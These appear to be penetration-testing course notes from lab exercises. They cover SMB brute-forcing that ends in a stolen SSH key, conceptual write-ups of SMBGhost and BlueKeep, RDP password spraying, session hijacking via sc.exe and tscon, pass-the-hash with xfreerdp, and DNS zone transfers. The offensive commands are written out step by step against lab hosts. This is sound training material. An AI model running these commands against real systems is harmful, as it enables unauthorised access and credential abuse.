Run Hydra against FTP on port 2121:

bash
hydra -L users.list -P passwords.list -s 2121 10.129.203.6 ftp

Result:

[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7

Connect to FTP:

bash
ftp 10.129.203.6 2121
# Username: robin
# Password: 7iz4rnckjsduza7
13.2 Task 2 — Brute-Force SMB (jason) and Find SSH Key

The target's SMB service rejected Hydra because it only supported SMBv2/v3. Medusa failed because the SMB module was not installed. CrackMapExec was the correct tool, but passwords containing @ caused a domain parsing issue requiring the -d . flag to prevent CrackMapExec from splitting the password at the @ symbol.

Step 1 — Hydra fails:

bash
hydra -l jason -P password.list 10.129.203.6 smb
# ERROR: target does not support SMBv1

Step 2 — Medusa fails:

bash
medusa -u jason -P password.list -h 10.129.203.6 -M smb
# ERROR: Couldn't load "smb" module

Step 3 — CrackMapExec with -d . flag:

bash
crackmapexec smb 10.129.203.6 -u jason -p password.list -d . --continue-on-success
# [+] .\jason:34c8zuNBo91!@28Bszh

Step 4 — Connect to SMB and download id_rsa:

bash
smbclient //10.129.203.6/GGJ -U jason%'34c8zuNBo91!@28Bszh'
smb: \> ls
smb: \> get id_rsa

Step 5 — SSH with the private key:

bash
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.203.6

Step 6 — Read the flag:

bash
ls
cat flag.txt
# HTB{SMB_4TT4CKS_2349872359}
13.3 Key Lessons Learned
Always use -s in Hydra to target non-standard ports like FTP on 2121
Use -L not -U in Hydra for plain text username lists
Hydra SMB only works on SMBv1 — if target uses SMBv2/v3 switch to CrackMapExec immediately
Passwords with @ need -d . in CrackMapExec to prevent domain separator confusion
Single quotes in bash prevent special characters like ! from being interpreted by the shell
Always chmod 600 id_rsa before using any SSH private key
Check every file in every accessible SMB share — SSH keys and credentials are commonly stored there
--continue-on-success prevents CrackMapExec from stopping after the first valid credential found
(Pwn3d!) in CrackMapExec output means admin rights — immediately try psexec or wmiexec
14. Latest SMB Vulnerabilities — SMBGhost (CVE-2020-0796)

SMBGhost is one of the most significant SMB vulnerabilities in recent years, assigned CVE-2020-0796, affecting SMB v3.1.1 in Windows 10 versions 1903 and 1909 as well as their Server equivalents. The vulnerability allowed an unauthenticated attacker to achieve Remote Code Execution with SYSTEM-level privileges — full control of the machine with zero credentials required. The flaw existed in the compression mechanism of SMBv3.1.1 and specifically in how the driver handled compressed data packets during SMB session negotiation before authentication takes place. Because the vulnerable code runs pre-authentication, there is no defensive configuration that blocks it — any machine reaching TCP port 445 on a vulnerable target can potentially exploit it without logging in first.

14.1 The Concept — Integer Overflow

At its core SMBGhost is an integer overflow in the SMB kernel driver function that processes compressed network packets. An integer overflow occurs when an arithmetic operation produces a result that exceeds the maximum value the allocated memory variable can hold, causing it to wrap around to an unexpected and unintended value. The vulnerability existed because the function handling compressed SMB packets lacked proper bounds checking on the size values provided by the network client during session negotiation. A crafted size value causes the overflow, which in turn controls how much data is copied into a fixed-size buffer — writing beyond the buffer into adjacent memory that contains CPU instructions. By carefully constructing the overflow payload, an attacker replaces those CPU instructions with their own shellcode, forcing the kernel driver to execute attacker-controlled code with full SYSTEM privileges.

14.2 How SMB Compression Works and Where It Breaks

SMBv3.1.1 introduced compression support to reduce bandwidth usage for large data transfers between client and server. During connection setup, client and server negotiate whether compression will be used through Negotiate Protocol Request and Response messages that happen before any authentication or file access. The vulnerability exists in server-side processing of malformed compressed messages arriving after the Negotiate Protocol Response is exchanged. If the compressed packet specifies a data size value that overflows the integer variable, the calculation produces a wrong result that controls buffer copy operations, writing attacker data beyond the buffer boundary into adjacent CPU instruction memory. Carefully structured overflow data replaces legitimate driver instructions with attacker shellcode, hijacking the execution flow entirely.

14.3 Attack Phase 1 — Initiation

The first phase involves sending a specially crafted malformed compressed SMB packet to the target on TCP port 445 before authentication. Because this vulnerability exists in pre-authentication code, no credentials, shares, or guest access are needed — just network reachability to port 445 is sufficient to begin the attack. The packet appears as a normal SMB session negotiation request on basic network monitoring, making it difficult to distinguish from legitimate traffic without deep packet inspection.

Step	SMBGhost Action	Attack Category
1	Attacker sends a manipulated malformed compressed packet to the target SMB server on TCP/445	Source
2	The compressed packet is processed according to the previously negotiated protocol responses	Process
3	Processing runs with full SYSTEM privileges inside the SMB kernel driver	Privileges
4	The local SMB kernel driver process is the destination responsible for processing the packet	Destination
14.4 Attack Phase 2 — Remote Code Execution

After the integer overflow corrupts the buffer in phase one, the second phase uses that corrupted state to inject and execute shellcode with SYSTEM privileges. The attacker's packet is crafted so that the data written beyond the buffer boundaries consists of valid CPU instructions — the shellcode — rather than random garbage. When the driver subsequently executes code from the corrupted memory region, it runs the attacker's injected instructions instead of legitimate driver code. These instructions establish a reverse shell or other backdoor connecting back to the attacker's machine, providing an interactive SYSTEM-level command prompt within seconds of exploitation.

Step	RCE Trigger Action	Attack Category
5	The overflowed buffer state from phase one serves as the source for the second attack cycle	Source
6	The integer overflow is exploited by replacing overwritten buffer with attacker shellcode, forcing CPU execution	Process
7	The same SYSTEM-level kernel driver privileges are used to execute the injected shellcode	Privileges
8	The attacker's remote system is the destination — the shellcode establishes reverse access to the local target	Destination
14.5 Mitigation and Detection

Microsoft released the patch for SMBGhost in March 2020 and any fully patched Windows 10 or Server system is protected. However unpatched systems remain extremely common in large enterprise environments years after patch release, making this a high-value check during internal network penetration tests. Always scan for this vulnerability during internal assessments against Windows 10 1903/1909 targets.

Check for vulnerability with Nmap:

bash
nmap -p 445 --script smb-vuln-cve-2020-0796 10.129.203.6

Vulnerable system indicators:

Windows 10 version 1903 or 1909
Windows Server version 1903 or 1909
SMBv3.1.1 enabled
Missing March 2020 security updates (KB4551762)

Defensive mitigations:

powershell
# Disable SMBv3 compression as temporary workaround (no reboot needed)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1

# Apply the official patch
# Install KB4551762 for Windows 10 1903/1909
Block TCP port 445 at the network perimeter to prevent external exploitation
Use network segmentation to limit which hosts can reach internal SMB services
Deploy endpoint detection tools that monitor for SMBGhost exploitation patterns


Attacking RDP — Detailed Notes
Attacking RDP

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection, making remote administration seamless and visually intuitive. It is one of the most popular administration tools in enterprise environments, allowing system administrators to centrally control their remote systems with the same functionality as if they were physically on-site, reducing the need for in-person intervention. Managed Service Providers (MSPs) frequently use RDP to manage hundreds of customer networks and systems simultaneously, making it deeply embedded in modern IT infrastructure management. By default, RDP uses port TCP/3389 as its communication channel, which means that scanning for this port during enumeration will reveal whether RDP is running on a target host. Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another attack gateway for adversaries who can exploit weak credentials, misconfigurations, or software vulnerabilities. Every time an administrator connects to a remote machine via RDP, they transmit credentials and session data across the network, which can be intercepted, replayed, or hijacked by an attacker who has positioned themselves appropriately within the network.

Enumeration

Before attacking any RDP service, the first task is to confirm the service is running on the target host and identify any relevant configuration details that will shape the attack approach. Using Nmap, we can identify the available RDP service on the target host by scanning TCP port 3389 and reading the service response returned by the scanner. The -Pn flag in the Nmap command is critical here because it disables host discovery (ICMP ping), which ensures that the scan proceeds even if the host is configured to not respond to ping requests — a common firewall configuration in Windows environments. When Nmap returns the state open for port 3389 with the service label ms-wbt-server, it confirms that RDP is listening and accessible on that target IP address. This initial scan can be further extended with -sV for version detection and -sC for default scripts to gather more detailed information about the RDP implementation and any immediately exploitable conditions. Enumeration of RDP is typically straightforward because the protocol identifies itself clearly, but the real intelligence comes from combining this port confirmation with broader context like OS version, patch level, and user account information gathered through other channels.

Command:

nmap -Pn -p3389 192.168.2.143

Output:

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server

The output confirms that port 3389 is open and the service ms-wbt-server (Microsoft Windows-Based Terminal Server) is active, meaning RDP is running and awaiting connections on this target.

Misconfigurations

Misconfigurations in RDP deployments are a common and significant attack surface because the protocol is frequently deployed quickly across large environments without hardening, leaving default settings and weak credential policies in place. Since RDP takes user credentials for authentication, one of the most common attack vectors against the RDP protocol is password guessing — attempting to discover valid username and password combinations by systematically testing credentials. In rare but notable cases, a misconfigured RDP service may have no password set at all for certain accounts, making authentication trivial and granting immediate access to anyone who connects. A critical caveat when performing password-guessing attacks against Windows instances is the client's password policy — many Windows environments lock or disable an account after a certain number of failed login attempts (typically 3 to 5), which means aggressive brute-forcing can inadvertently lock out valid accounts and trigger security alerts. To avoid account lockout, a more controlled technique called Password Spraying is used, which tries a single commonly used password across many usernames before moving to the next password, greatly reducing the per-account attempt count while still covering a wide attack surface. Two tools commonly used for RDP password spraying are Crowbar and Hydra, both of which support the RDP protocol and can read lists of usernames and passwords from files to automate the testing process efficiently.

Crowbar — RDP Password Spraying

Crowbar is a brute-forcing tool specifically designed for protocols that are difficult to attack with traditional tools, and it includes RDP support making it well-suited for password spraying campaigns against Windows systems. The -b rdp flag tells Crowbar to use its RDP module, targeting the RDP service running on the specified host rather than other supported protocols like SSH or VNC. The -s 192.168.220.142/32 flag specifies the target IP address in CIDR notation — the /32 means only the single specific host is targeted, not a subnet range. The -U users.txt flag provides a file containing a list of usernames to test the password against, and Crowbar will iterate through each username in sequence. The -c 'password123' flag specifies the single password to spray across all usernames in the list, which is the core principle of password spraying — one password against many accounts. Crowbar reports results in real time and immediately outputs RDP-SUCCESS when a valid credential combination is found, including the host, port, username, and password.

Step-by-Step — RDP Password Spraying with Crowbar:

Step 1 — Prepare the username list:

cat usernames.txt
root
test
user
guest
admin
administrator

This list is created from common default Windows account names or accounts discovered through prior enumeration such as SMTP VRFY, LDAP queries, or SMB enumeration.

Step 2 — Run the Crowbar spray:

crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
-b rdp — activates the RDP protocol module
-s 192.168.220.142/32 — targets the single host at this IP address
-U users.txt — reads the usernames to test from the file
-c 'password123' — sets the single password to spray across all usernames

Step 3 — Read the output:

2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123

The valid credentials administrator:password123 were found on the target host, confirming successful authentication is possible with these credentials.

Hydra — RDP Password Spraying

Hydra is a highly versatile, parallel login brute-forcing tool that supports dozens of protocols including RDP, FTP, SSH, HTTP, and many others, making it a universal credential-testing tool for penetration testers. The -L usernames.txt flag provides the file containing usernames, and Hydra will iterate through each one during the spray — this is uppercase -L for a file, not lowercase -l for a single user. The -p 'password123' flag (lowercase) specifies the single password to spray — this is the password spraying approach, unlike -P (uppercase) which would supply a password list for brute-forcing. An important Hydra warning during RDP attacks is that RDP servers dislike many parallel connections, so Hydra recommends using -t 1 or -t 4 to reduce the thread count and -W 1 or -W 3 to introduce wait time between attempts, which prevents the server from dropping connections or triggering lockouts due to connection flooding. The rdp argument at the end specifies the service module to use, directing Hydra to format its authentication attempts as RDP login requests rather than another protocol format. Like Crowbar, Hydra reports success immediately when a valid credential pair is found, outputting the host, port, login, and password for the tester to use.

Command:

hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Output:

[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
RDP Login

Once valid credentials have been discovered through password spraying or other means, the next step is to actually establish an RDP session to the target host using those credentials and an appropriate RDP client. Two commonly used RDP clients in Linux-based penetration testing environments are rdesktop and xfreerdp, both of which are command-line tools that support connecting to Windows RDP services from a Linux or Unix-like system. The rdesktop command uses -u to specify the username and -p to specify the password, followed by the target IP address — it launches a graphical window displaying the remote Windows desktop upon successful connection. A common warning during RDP login with rdesktop is an invalid security certificate message, where the server is using a self-signed certificate not trusted by the connecting system — the tester must manually type yes to accept and add the certificate as an exception to proceed. The xfreerdp client is the modern alternative and offers more features, including Pass-the-Hash support (/pth:), domain specification (/d:), and better handling of NLA (Network Level Authentication) — flags use forward-slash syntax rather than the dash syntax used by rdesktop. After accepting the certificate warning in rdesktop, the graphical Windows desktop appears, and the tester has full interactive access to the remote system identical to being physically at the machine.

Command:

rdesktop -u admin -p password123 192.168.2.143

The connection proceeds, a certificate warning appears, and after typing yes, the full Windows graphical desktop is presented in a new window on the attacker's screen, confirming successful RDP access.

Protocol Specific Attacks

Protocol-specific attacks against RDP go beyond simple credential attacks and target the deeper mechanics of how RDP sessions are managed, authenticated, and maintained on the Windows operating system. Two particularly powerful protocol-specific attacks against RDP are Session Hijacking and Pass-the-Hash (PtH), both of which allow attackers to gain access to an RDP session or target system without necessarily knowing the plaintext password of the victim account. These attacks are especially relevant in post-exploitation scenarios where the attacker has already gained a foothold on a machine and is looking to move laterally, escalate privileges, or impersonate other users who happen to be connected to the same system via RDP. Understanding how Windows manages RDP sessions — assigning each session a SESSION ID and a session name — is critical for executing these attacks correctly because both attacks rely on interacting with these session identifiers at the OS level. The attacks also demonstrate why gaining even a low-privilege foothold on a Windows machine that has other users connected via RDP can be far more impactful than it initially appears, because that foothold can quickly become SYSTEM-level access or domain-level privilege escalation. These attacks highlight the inherent security risk of RDP as an administration protocol and explain why network segmentation, NLA enforcement, and credential hygiene are critical defensive measures in any environment where RDP is used.

RDP Session Hijacking

RDP Session Hijacking is a technique that allows an attacker who already has access to a Windows machine with Administrator privileges to silently take over another user's active RDP session without knowing that user's password, by using the built-in Windows tool tscon.exe. The attack works because tscon.exe (Terminal Services Connect) is a legitimate Microsoft binary that allows users to connect to another desktop session by specifying the target SESSION ID and the destination session name — but when abused with SYSTEM privileges, it bypasses the password requirement entirely. To successfully impersonate a user without their password, SYSTEM-level privileges are required, which can be obtained from a local administrator account using tools like PsExec or Mimikatz, or through the Windows service trick described below. The query user command is used first to list all currently active RDP sessions on the machine, revealing the usernames, session names (e.g., rdp-tcp#13), session IDs, and logon times of all connected users. Once the target session ID is identified, a Windows service is created using sc.exe (Service Control Manager binary) with a binpath that executes tscon to connect the target session to the attacker's current session — services run as LocalSystem by default, providing the required SYSTEM privileges automatically. Starting the service with net start sessionhijack triggers execution, and the target user's desktop immediately appears in the attacker's RDP window, granting full access to everything that user had open.

Step-by-Step — RDP Session Hijacking:

Step 1 — List all active RDP sessions:

C:\htb> query user
 USERNAME     SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
>juurena      rdp-tcp#13     1  Active          7  8/25/2021 1:23 AM
 lewen        rdp-tcp#14     2  Active          *  8/25/2021 1:28 AM

The query user command displays all currently logged-in users on the machine. The > symbol indicates the current session (juurena on rdp-tcp#13 with ID 1). The target is lewen on session ID 2.

Step 2 — Create a Windows service to hijack the session:

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
sc.exe create sessionhijack — creates a new Windows service named sessionhijack
binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13" — sets the service binary path to execute cmd.exe which runs tscon 2 to connect session ID 2 (lewen) to rdp-tcp#13 (our session)
cmd.exe /k — runs the command and keeps the terminal open

Output: [SC] CreateService SUCCESS confirms the service was created.

Step 3 — Start the service to trigger the hijack:

C:\htb> net start sessionhijack

Starting the service causes it to execute as LocalSystem (SYSTEM), which provides the elevated privileges needed for tscon.exe to bypass password authentication and connect the victim's session directly to the attacker's RDP window.

Step 4 — Verify access:
After the service starts, the lewen user's desktop takes over the current RDP window, and a whoami command confirms the attacker is now operating as lewen. From here, any actions taken — file access, running tools, browsing internal resources — are performed under the identity and permissions of lewen.

Note: This method no longer works on Windows Server 2019.

RDP Pass-the-Hash (PtH)

RDP Pass-the-Hash is an attack technique that allows an attacker who possesses only the NTLM hash of a user's password — rather than the plaintext password — to authenticate to an RDP session and gain full graphical access to the target Windows system without ever cracking the hash. This situation arises commonly in post-exploitation scenarios where credential dumping tools like Mimikatz or secretsdump extract NTLM hashes from the SAM database or LSASS memory but the hashes cannot be cracked offline due to password complexity. The key requirement for this attack to work is that Restricted Admin Mode must be enabled on the target host — this is a Windows security feature that, when enabled, allows RDP sessions to use network authentication without transmitting the user's cleartext credentials to the remote system, which also enables hash-based authentication to work. By default, Restricted Admin Mode is disabled on most Windows hosts, and attempting PtH without enabling it will result in an error message about account restrictions preventing sign-in. To enable Restricted Admin Mode, a registry DWORD value named DisableRestrictedAdmin must be added under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa and set to 0x0 (zero), which paradoxically named, actually enables the feature when set to 0. Once the registry key is in place, xfreerdp with the /pth: flag is used to pass the NTLM hash directly as the authentication credential, establishing a full RDP session without ever knowing the plaintext password.

Step-by-Step — RDP Pass-the-Hash:

Step 1 — Enable Restricted Admin Mode via registry (if not already enabled):

C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
reg add — adds a new registry key or value
HKLM\System\CurrentControlSet\Control\Lsa — the registry path where the Lsa (Local Security Authority) settings are stored
/t REG_DWORD — specifies the data type as a 32-bit DWORD value
/v DisableRestrictedAdmin — names the value DisableRestrictedAdmin
/d 0x0 — sets the data to 0 (zero), which enables Restricted Admin Mode
/f — forces the operation without prompting for confirmation

Step 2 — Use xfreerdp with the NTLM hash:

xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
/v:192.168.220.152 — specifies the target RDP server IP address
/u:lewen — specifies the username whose hash is being used for authentication
/pth:300FF5E89EF33F83A8146C10F5AB9BB9 — passes the NTLM hash directly instead of a plaintext password

Step 3 — Verify successful access:
After the connection establishes, a whoami command in the RDP session returns superstore\lewen, confirming the attacker is authenticated and operating as the target user without ever knowing or cracking their plaintext password.

Note: RDP PtH will not work against every Windows system — Restricted Admin Mode must be enabled and the user must have RDP access rights to the target machine — but it is always worth attempting when an NTLM hash and RDP access are available.

Latest RDP Vulnerabilities

In 2019, a critical and widely publicized vulnerability was discovered in the RDP service affecting TCP port 3389, assigned CVE-2019-0708 and commonly known as BlueKeep, which allows an unauthenticated remote attacker to execute arbitrary code on vulnerable Windows systems simply by sending a specially crafted RDP connection request. BlueKeep is classified as a wormable vulnerability — meaning it can self-propagate across networks without any user interaction, similar in danger profile to the EternalBlue vulnerability that powered the WannaCry ransomware outbreak in 2017. The vulnerability does not require prior access to the system, valid credentials, or any user interaction to trigger, making it particularly severe because any exposed RDP service on a vulnerable Windows version is potentially exploitable directly from the internet or an internal network. An initial scan conducted in May 2019 identified approximately 950,000 Windows systems publicly exposed and vulnerable to BlueKeep attacks, and even years later, approximately a quarter of those hosts remain unpatched and vulnerable. Large organizations such as hospitals, government agencies, and industrial operators — whose software is tightly coupled to specific Windows versions and cannot easily be updated without breaking critical systems — are particularly vulnerable because infrastructure maintenance and patching costs are prohibitively high. Microsoft released security patches for all affected Windows versions, including some versions that had already reached end-of-life support, recognizing the severity of the threat — but patch adoption has remained incomplete across many sectors.

The Concept of the Attack

The BlueKeep vulnerability is rooted in a Use-After-Free (UAF) memory corruption bug in the RDP service's kernel-level channel management code, specifically triggered during the initial connection setup phase before any user authentication is required. The attack begins with the client sending a manipulated initialization request during the settings exchange handshake between the RDP client and server — this is the phase where the client and server negotiate capabilities, encryption, and channel configurations before authentication takes place. The manipulated request causes the RDP service to invoke a vulnerable function responsible for creating a virtual channel, which contains the UAF flaw — this function frees a region of memory but the freed pointer continues to be referenced and used by other parts of the code, creating the exploitable condition. Because the RDP service runs with the LocalSystem Account — the highest privilege level on a Windows system, equivalent to SYSTEM — any code execution achieved through this vulnerability immediately runs with full system privileges, making privilege escalation unnecessary after the exploit succeeds. The exploit proceeds in two phases: first the Initiation phase where the manipulated request triggers the UAF condition and redirects execution flow into the kernel, and then the RCE Trigger phase where a carefully crafted payload is written into the freed kernel memory and executed by the CPU, resulting in remote code execution. The final result of a successful BlueKeep exploit is typically a reverse shell connecting back to the attacker's machine over the network, giving complete remote control of the target system with SYSTEM-level privileges and no prior authentication required.

Initiation of the Attack

The initiation phase of the BlueKeep exploit focuses on establishing the RDP connection and triggering the vulnerable code path through the manipulated settings exchange request, setting up the memory corruption condition before any payload is delivered. During the RDP handshake, the client sends various protocol negotiation messages including channel initialization requests — it is one of these channel creation requests that contains the malformed data triggering the vulnerable function in the RDP kernel driver. This is critically different from most remote exploits that require some form of authentication before reaching exploitable code — BlueKeep fires in the pre-authentication phase, meaning the server processes the malicious data before it ever validates who is connecting. The RDP service is automatically run with LocalSystem Account privileges because it is a core Windows system service that must have administrative access to manage sessions, enforce policies, and interact with the kernel — this privilege level is what makes the eventual code execution so devastating. The manipulated channel creation request causes the vulnerable function to redirect execution flow toward the kernel, setting up the second phase of the attack where actual payload delivery and execution occurs. No user on the target machine needs to be logged in, no session needs to be active, and no interaction is required — simply having the RDP service listening on port 3389 and being reachable by the attacker is sufficient to initiate the exploit.

Initiation Phase — Concept of Attacks Table:

Step	BlueKeep Action	Category
1	The attacker sends a manipulated initialization request during the RDP settings exchange handshake between client and server	Source
2	The request invokes a function used to create a virtual channel that contains the Use-After-Free vulnerability	Process
3	The RDP service runs automatically with LocalSystem Account privileges, so the entire exploit chain benefits from SYSTEM-level access	Privileges
4	The manipulation of the vulnerable function redirects execution flow into a kernel-level process, setting up the second phase	Destination
Trigger Remote Code Execution

The remote code execution trigger phase is the second and final phase of the BlueKeep exploit, where the attacker's payload is written into the freed kernel memory region and the CPU is directed to execute it, resulting in full SYSTEM-level code execution on the target machine. The payload crafted by the attacker is specifically designed to exploit the UAF condition — it fills the freed memory region with controlled data at precisely the right moment so that when the dangling pointer references the freed memory, it reads the attacker's shellcode instead of legitimate kernel data. The kernel process is then manipulated to free the relevant memory region and point the CPU's instruction pointer to the location where the attacker's code has been placed, causing the processor to execute the injected shellcode as if it were legitimate kernel code. Since the kernel itself runs at the highest possible privilege level on the system (Ring 0 in CPU architecture terms, mapped to SYSTEM in Windows terms), the injected instructions execute with LocalSystem Account privileges — the same account under which the RDP service was running. The most common payload delivered through BlueKeep exploitation is a reverse shell — shellcode that opens a network connection from the compromised target back to the attacker's machine, dropping the attacker into a SYSTEM-level command prompt on the victim machine. Not all newer Windows versions are vulnerable to BlueKeep — Windows 8, Windows 10, Windows Server 2012, Windows Server 2016, and Windows Server 2019 are not affected — but older versions including Windows 7, Windows XP, Windows Server 2003, and Windows Server 2008 are vulnerable if unpatched.

RCE Trigger Phase — Concept of Attacks Table:

Step	BlueKeep Action	Category
5	The attacker's crafted payload is the source, inserted into the process to free kernel memory and place shellcode instructions in the freed region	Source
6	The kernel process is triggered to free the targeted memory region and direct the CPU instruction pointer to the attacker's shellcode	Process
7	Since the kernel runs with the highest possible privileges (LocalSystem), the shellcode placed in the freed kernel memory also executes with full LocalSystem Account privileges	Privileges
8	A reverse shell is sent over the network from the compromised target back to the attacker's host, granting full SYSTEM-level remote access	Destination
Attacking DNS — Detailed Notes
Attacking DNS

The Domain Name System (DNS) is a foundational internet protocol responsible for translating human-readable domain names (e.g., hackthebox.com) into numerical IP addresses (e.g., 104.17.42.72) that computers use to route network traffic. DNS primarily operates over UDP port 53 because UDP is connectionless and fast, making it ideal for the small query-and-response packets that most DNS lookups involve — however, DNS also uses TCP port 53 for larger responses, zone transfers, and other operations where reliability of delivery is required. DNS has always been designed to use both UDP and TCP port 53 from the start, with UDP serving as the default and TCP as the fallback when a response packet is too large to fit in a single UDP datagram. Since virtually every network application and user activity begins with a DNS lookup, attacks against DNS servers represent one of the most prevalent, high-impact, and far-reaching threat categories in modern cybersecurity. Successful DNS attacks can redirect users to malicious servers, expose the internal network topology of an organization, enable subdomain takeover for phishing, or even allow an attacker to intercept and manipulate all DNS-dependent traffic on a network segment. Understanding DNS attacks requires knowledge of how DNS records work — especially A records (IP mapping), MX records (mail servers), CNAME records (aliases), NS records (name servers), and SOA records (zone authority) — because each record type presents different attack opportunities.

Enumeration

DNS enumeration is the process of systematically extracting information about a target organization's DNS infrastructure, including its name servers, subdomains, mail servers, IP addresses, and zone configurations. The Nmap -sC (default scripts) and -sV (version scan) options can be combined and targeted at port 53 to perform initial enumeration against target DNS servers, revealing the DNS software name and version (e.g., ISC BIND 9.11.3) which can then be researched for known vulnerabilities. DNS holds an exceptionally rich set of intelligence about an organization — from its web servers and mail infrastructure to internal hostnames, third-party service integrations, and network segmentation details — making thorough DNS enumeration a critical step in the reconnaissance phase of any engagement. The version information revealed by -sV is particularly valuable because specific versions of DNS server software like BIND, PowerDNS, or Microsoft DNS have known CVEs that can be directly exploited if the server is running an unpatched version. Beyond Nmap, specialized DNS enumeration tools like dig, host, fierce, subfinder, and subbrute provide deeper DNS-specific reconnaissance capabilities that go far beyond what a general-purpose port scanner can reveal. Effective DNS enumeration maps out the attack surface comprehensively before exploitation begins, identifying opportunities for zone transfers, subdomain takeovers, cache poisoning, and other DNS-specific attack vectors.

Command:

nmap -p53 -Pn -sV -sC 10.10.110.213

Output:

PORT   STATE SERVICE   VERSION
53/tcp open  domain    ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
DNS Zone Transfer

A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages, containing all the DNS records for the domain and its subdomains, effectively serving as a database of the organization's DNS infrastructure. DNS zone transfers are a mechanism by which DNS servers copy a portion of their zone database to another DNS server, originally designed for legitimate replication between primary and secondary DNS servers to ensure redundancy and consistency across the DNS infrastructure. The critical security problem with DNS zone transfers is that unless a DNS server is explicitly configured to restrict which IP addresses are allowed to request a zone transfer, anyone can send an AXFR (Authoritative Transfer) request and receive a complete copy of the entire zone database without any authentication. This means that a misconfigured DNS server leaks all internal hostnames, IP addresses, subdomains, mail server configurations, and other DNS records to any attacker who simply asks for them — effectively handing the attacker a complete map of the organization's network topology. DNS zone transfers use TCP port 53 rather than the usual UDP port 53 because TCP's reliable, ordered data delivery is necessary for transferring the potentially large volume of records that make up a complete zone file. An attacker who successfully performs a zone transfer can use the exposed internal hostnames and IP addresses to identify high-value targets, internal services, development servers, and other assets that would otherwise require extensive scanning to discover.

DIG — AXFR Zone Transfer

The dig utility is a powerful DNS query tool built into most Linux distributions that can perform all types of DNS queries including zone transfers, making it the primary tool for testing whether a DNS server is vulnerable to unauthorized AXFR requests. The AXFR (Authoritative Full Transfer) record type in a dig query specifically requests a complete copy of the entire zone file from the target DNS server, which — if the server is misconfigured — it will fulfill without any authentication or access control. The command syntax dig AXFR @ns1.inlanefreight.htb inlanefreight.htb breaks down as: AXFR is the query type requesting the zone transfer, @ns1.inlanefreight.htb specifies the nameserver to query directly (bypassing normal DNS resolution), and inlanefreight.htb is the domain whose zone is being requested. A successful zone transfer response contains SOA (Start of Authority) records identifying the primary nameserver, A records mapping hostnames to IPs, NS records identifying all nameservers, AAAA records for IPv6 addresses, and any other record types configured in the zone. The output reveals internal IP addresses and hostnames such as admin.inlanefrieght.htb (10.129.110.21), hr.inlanefrieght.htb (10.129.110.25), and support.inlanefrieght.htb (10.129.110.28), which are internal resources not publicly advertised but now fully exposed to the attacker. This information directly feeds into the next phases of an engagement — the attacker now knows exactly which hosts exist on the internal network, their IP addresses, and their functional roles based on their hostnames, enabling highly targeted subsequent attacks.

Command:

dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

Output:

inlanefrieght.htb.         604800  IN  SOA   localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN  A     10.129.110.22
admin.inlanefrieght.htb.   604800  IN  A     10.129.110.21
hr.inlanefrieght.htb.      604800  IN  A     10.129.110.25
support.inlanefrieght.htb. 604800  IN  A     10.129.110.28
Fierce — Zone Transfer Enumeration

Fierce is a DNS enumeration and zone transfer testing tool that automatically discovers all DNS servers for a target root domain and then attempts a zone transfer against each one, combining multiple DNS reconnaissance steps into a single automated workflow. Unlike dig, which requires the tester to specify the nameserver manually, Fierce automatically queries for NS records to identify all nameservers for the domain and then attempts the zone transfer against each discovered nameserver in sequence, maximizing the chances of finding a misconfigured server. The --domain flag followed by the target domain (zonetransfer.me in the example) instructs Fierce to begin its enumeration from the root of that domain, discovering its NS and SOA records before attempting the zone transfer. A successful zone transfer with Fierce returns a comprehensive dictionary-like output containing all DNS record types including A records, MX records, TXT records, SRV records, HINFO records, LOC records, and PTR records — far more complete than what most manual scans would reveal. The output from zonetransfer.me reveals sensitive internal information including internal IP ranges (81.4.108.41, 167.88.42.94), contact phone numbers embedded in TXT records, physical location coordinates in LOC records, and internal nameservers — all information that should never be publicly accessible. Fierce is particularly useful at the beginning of an engagement when the goal is to get the broadest possible view of a target's DNS infrastructure as quickly as possible before narrowing focus to specific attack vectors.

Command:

fierce --domain zonetransfer.me
Domain Takeovers & Subdomain Enumeration

Domain takeover is a high-impact attack technique that involves registering or claiming a domain name that was previously used by a target organization but has since expired or been abandoned, allowing the attacker to gain control over that domain and anything that depends on it. If attackers find an expired domain that is still referenced in DNS records, email links, or web applications, they can register that domain themselves and use it to host malicious content, intercept traffic, or conduct phishing campaigns that appear to originate from a trusted address associated with the target organization. A particularly dangerous and more common variant is subdomain takeover, which targets CNAME records in a domain's DNS configuration that point to third-party services (like AWS S3, GitHub Pages, Heroku, Fastly, Akamai, or Azure) whose associated accounts or resources have been deleted or expired. The attack scenario works like this: an organization creates sub.target.com as a CNAME pointing to someservice.amazonaws.com, later deletes the S3 bucket or service account, but forgets to remove the CNAME record from their DNS — anyone who registers that AWS resource name now automatically receives all traffic directed to sub.target.com. This is dangerous because sub.target.com is still a legitimate subdomain of the target organization — visitors see it as part of the official domain and trust it completely, even though the content is now entirely controlled by the attacker. The can-i-take-over-xyz repository on GitHub is an excellent reference that lists known vulnerable services and provides guidelines for assessing whether a specific CNAME target is vulnerable to subdomain takeover.

Subdomain Enumeration

